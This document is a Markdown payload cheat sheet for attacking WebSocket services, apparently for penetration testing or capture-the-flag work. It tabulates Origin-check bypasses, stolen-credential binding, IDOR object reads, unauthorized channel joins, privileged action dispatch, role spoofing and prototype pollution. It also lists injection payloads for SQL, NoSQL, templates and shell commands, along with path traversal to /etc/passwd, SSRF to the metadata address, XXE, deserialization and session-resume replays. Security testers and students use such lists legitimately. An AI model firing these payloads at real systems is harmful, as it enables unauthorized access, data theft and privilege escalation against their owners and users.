# Payload map — the payload → the field → the oracle

## The Origin payload-map

| Payload | The cell | The oracle |
|---|---|---|
| `Origin: https://evil.example` | `origin` | `101`=accept / `403`=check |
| `Origin: null` | `origin` | `101`=null-bypass |
| `Origin: file://` | `origin` | `101`=file-bypass |
| `Origin: https://target.evil.com` | `origin` | `101`=endswith-bypass |
| `Origin: https://target.com.evil.com` | `origin` | `101`=suffix-bypass |
| `Origin: https://sub.target.com` | `origin` | `101`=subdomain |
| `Origin: https://eviltarget.com` | `origin` | `101`=substring |
| `Origin: https://targetcom.com` | `origin` | `101`=similar-name |
| (no Origin) | `origin` | `101`=no-Origin |

## The binding payload-map

| Payload | The cell | The oracle |
|---|---|---|
| `Cookie: session=<victim>` | `binding` | the bound identity |
| `Authorization: Bearer <t>` | `binding` | the bound identity |
| `Authorization: Basic <b64>` | `binding` | the bound identity |
| `?token=<jwt>`/`?jwt=<jwt>`/`?auth=<x>` | `token`/`binding` | the bound identity + the URL-leak |
| `?key=<key>`/`?api_key=<key>`/`?session=<s>` | `token`/`binding` | the URL-credential |
| `X-Api-Key: <key>`/`X-Auth-Token: <t>` | `binding` | the bound identity |
| `{"type":"auth","token":"<x>"}`/`40{"token"}`/`{"type":"connection_init","payload":{"authToken":"<x>"}}` | `frame-auth` | the frame-bound identity |
| `CONNECT login:<u> passcode:<p>` | `stomp-auth` | the stomp-bound identity |

## The object-IDOR payload-map

| Payload | The field | The oracle |
|---|---|---|
| `{"action":"read","id":"<other>"}` | `id` | another's object |
| `{"action":"open","doc":"<other>"}` | `doc` | another's doc |
| `{"action":"history","room":"<other>"}` | `room` | another's room |
| `{"action":"conversation","id":"<other>"}` | `conversation` | another's conversation |
| `{"action":"get","user_id":<n>}` | `user_id` | another's record |
| `{"action":"view","account":"<other>"}` | `account` | another's account |
| `{"action":"list","org":"<other>"}` | `org` | another's org |
| `{"action":"export","object":"<other>"}` | `object` | another's object |
| `{"action":"read","id":"me"/"self"/"current"/"0"/"-1"}` | `id` | the alias/edge ids |
| `{"action":"read","id":<n>}` for `n` in `1..200` | `id` | the sequential id-space |

## The membership payload-map

| Payload | The field | The oracle |
|---|---|---|
| `{"action":"join","room":"admin"}` | `room` | the restricted feed |
| `{"action":"join","channel":"internal"}` | `channel` | the internal feed |
| `{"action":"subscribe","channel":"internal"}` | `channel` | the internal feed |
| `{"action":"subscribe","topic":"/user/<other>/events"}` | `topic` | another's topic |
| `{"action":"watch","doc":"admin-doc"}` | `doc` | another's doc-feed |
| `{"action":"listen","topic":"internal"}` | `topic` | the internal feed |
| `{"action":"follow","channel":"private"}` | `channel` | the private feed |
| `{"action":"subscribe","channel":"#"}`/`"+"` | `channel`/`topic` | the wildcard |

## The dispatch payload-map

| Payload | The field | The oracle |
|---|---|---|
| `{"action":"admin"/"debug"/"internal"/"system"}` | `action` | a privileged reply |
| `{"action":"eval","code":"x"}/"exec","cmd":"id"/"sql","q":"x"` | `action` | an eval/exec/sql |
| `{"action":"flag"/"secret"/"config","key":"x"}` | `action` | the flag/config |
| `{"action":"broadcast"/"announce"/"emit-all"/"send_all"}` | `action` | a cross-client write |
| `{"action":"set_role","role":"admin"/"impersonate"/"grant"/"reset"}` | `action` | a privilege-esc |
| `{"action":"dump"/"export"/"backup"/"metrics"/"reload"/"migrate"}` | `action` | a dump/export |
| `{"action":"admin:x"/"system.exec"/"internal/cmd"/"debug/x"}` | `action`/`type` | a namespaced action |
| `{"type":"admin"/"internal"/"system"}` | `type` | a type-dispatch |
| `{"event":"admin"/"debug"/"internal"}` | `event` | an event-dispatch |
| `{"cmd":"admin"/"exec","command":"id"}` | `cmd`/`command` | a cmd-dispatch |

## The grant/spoof payload-map

| Payload | The field | The oracle |
|---|---|---|
| `{"action":"x","role":"admin"}` | `role` | the grant accepted |
| `{"action":"x","is_admin":true/"debug":true/"internal":true}` | `is_admin`/`debug`/`internal` | the grant |
| `{"action":"x","perm":["admin"],"scope":"*"}` | `perm`/`scope` | the grant |
| `{"action":"x","user":{"role":"admin"}}` | `user` | a nested grant |
| `{"action":"x","__proto__":{"role":"admin"}}` | `__proto__` | a polluted grant |
| `{"from":"<other>","action":"x"}` | `from` | acts-as-other |
| `{"user_id":<n>,"action":"x"}` | `user_id` | acts-as-other |
| `{"sender":"admin","action":"x"}` | `sender` | acts-as-other |
| `{"user":{"id":"<other>","role":"admin"},"action":"x"}` | `user` | a claimed principal |

## The injection payload-map

| Payload | The field | The oracle |
|---|---|---|
| `{"q":"' OR 1=1--"}/"q":"x' UNION SELECT flag,2,3--"}` | `q`/`filter`/`id`/`where`/`order` | the sqli rows |
| `{"q":{"$ne":null}}/"id":{"$gt":""}/"q":{"$where":"return true"}}` | `q`/`id`/`find` | the nosqli docs |
| `{"name":"{{7*7}}"/"tpl":"${7*7}"/"text":"<%= 7*7 %>"}` | `name`/`tpl`/`text`/`msg`/`input`/`value` | `49` evaluated |
| `{"host":"x;id"/"cmd":"id"/"exec":"cat /flag"/"target":"x|id"}` | `host`/`cmd`/`exec`/`command`/`target`/`input` | the cmd output |
| `{"file":"../../etc/passwd"/"path":"/flag"/"doc":"..\\..\\x"}` | `file`/`path`/`filename`/`doc`/`name` | the file |
| `{"url":"http://169.254.."/"fetch":".."/"webhook":".."}` | `url`/`fetch`/`webhook`/`callback`/`image`/`import` | a fetch reply |
| `{"xml":"<!DOCTYPE..<!ENTITY..>"}` | `xml`/`data`/`import`/`parse`/`svg` | the entity data |
| `{"data":"<serialized>"/"obj":"<ser>"/"session":"<ser>"}` | `data`/`obj`/`session`/`import`/`parse` | the deser output |
| `{"obj":{"__proto__":{"isAdmin":true}}/"set":{"key":"__proto__.x"}}` | `obj`/`config`/`set`/`merge`/`key`/`value` | a polluted obj |

## The resume/history payload-map

| Payload | The field | The oracle |
|---|---|---|
| `{"session_id":"<old>"}/{"resume":"<x>"}` | `session_id`/`resume` | a resumed context |
| `{"reconnect":true,"session_id":"<x>"}` | `reconnect` | a resumption |
| `{"seq":0}/{"offset":0}/{"lastEventId":-1}` | `seq`/`offset`/`lastEventId` | the backlog |
| `{"action":"history","room":"<x>","from":0,"to":N}` | `history`/`from`/`to` | the backlog |
| `{"action":"backlog","channel":"<x>"}` | `backlog`/`channel` | the backlog |
| `{"action":"fetch","since":"<old-ts>"}` | `since` | the backlog |
| `/socket.io/?EIO=4&transport=websocket&sid=<old>` | the `sid` param | a session-resume |

## The map-record

`map: <the payload>: <the field>: <the oracle>` — each payload mapped
to its field + the oracle reply.
